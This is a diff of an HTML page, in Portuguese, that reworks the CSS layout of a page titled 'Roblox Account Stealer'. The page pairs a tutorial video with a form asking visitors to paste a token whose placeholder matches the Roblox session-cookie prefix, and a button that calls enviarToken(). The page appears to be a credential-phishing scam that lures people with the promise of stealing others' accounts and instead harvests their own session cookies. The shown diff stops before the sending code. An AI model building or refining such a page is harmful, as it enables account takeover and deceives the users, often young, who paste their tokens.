@@ -9,35 +9,42 @@
             background: #1a1a1a; 
             color: #eee; 
             margin: 0;
-            padding: 80px 20px;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
         }
-        /* Grid para manter o vídeo à esquerda e o form à direita sem se moverem */
-        .main-layout { 
-            display: grid; 
-            grid-template-columns: 1fr 1fr; 
-            gap: 40px; 
-            max-width: 1200px; 
-            margin: 0 auto;
-            align-items: start;
-        }
+        /* Vídeo fixado no lado esquerdo */
         .video-section { 
-            text-align: left; 
+            position: absolute;
+            left: 50px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 400px;
+            text-align: left;
+        }
+        .video-section iframe {
+            border-radius: 8px;
+            border: 1px solid #333;
         }
         .video-section p { 
-            margin-top: 15px; 
-            font-size: 1.2em; 
-            font-weight: bold;
+            margin-top: 10px; 
+            font-size: 1.1em;
+            color: #ccc;
         }
+        /* Container de captura CENTRALIZADO */
         .container { 
             border: 1px solid #333; 
             padding: 40px; 
             border-radius: 10px; 
             background: #252525; 
             text-align: center;
+            z-index: 10;
+            width: 400px;
         }
         input { 
             width: 100%; 
-            max-width: 350px; 
             padding: 12px; 
             margin: 15px 0; 
             border-radius: 5px; 
@@ -45,8 +52,10 @@
             background: #111; 
             color: #0f0; 
             font-family: monospace; 
+            box-sizing: border-box;
         }
         button { 
+            width: 100%;
             padding: 12px 25px; 
             cursor: pointer; 
             background: #dc3545; 
@@ -59,19 +68,17 @@
     </style>
 </head>
 <body>
-    <div class="main-layout">
-        <div class="video-section">
-            <iframe width="100%" height="315" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0" allowfullscreen></iframe>
-            <p>Tutorial pra pc</p>
-        </div>
+    <div class="video-section">
+        <iframe width="100%" height="225" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0" allowfullscreen></iframe>
+        <p>Tutorial pra pc</p>
+    </div>
 
-        <div class="container">
-            <h2>Roblox Account Stealer</h2>
-            <p>Insira o token aqui</p>
-            <input type="text" id="userToken" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
-            <br>
-            <button onclick="enviarToken()">Enviar token</button>
-        </div>
+    <div class="container">
+        <h2>Roblox Account Stealer</h2>
+        <p>Insira o token aqui</p>
+        <input type="text" id="userToken" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
+        <br>
+        <button onclick="enviarToken()">Enviar token</button>
     </div>
 
     <script>
